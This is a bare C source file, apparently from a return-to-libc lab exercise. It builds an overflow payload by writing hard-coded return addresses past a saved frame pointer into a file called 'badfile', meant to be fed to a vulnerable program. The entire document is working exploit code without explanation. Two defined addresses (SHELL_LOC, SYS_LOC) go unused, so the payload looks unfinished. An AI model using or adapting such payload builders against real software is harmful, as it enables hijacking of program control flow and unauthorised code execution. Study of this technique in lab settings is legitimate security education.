/* exploit.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SHELL_LOC 0xbfffff65
#define BAR_LOC 0x8048567
#define EXIT_LOC 0xb7d989d0
#define SYS_LOC 0xb7da4da0
#define EBP 70
int main(int argc, char **argv)
{
	char buf[300];
	FILE *badfile;
	badfile = fopen("./badfile", "w");
	*(long *) &buf[EBP+4] = BAR_LOC; 
	*(long *) &buf[EBP+8] = BAR_LOC; 
	*(long *) &buf[EBP+12] = EXIT_LOC;
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
}
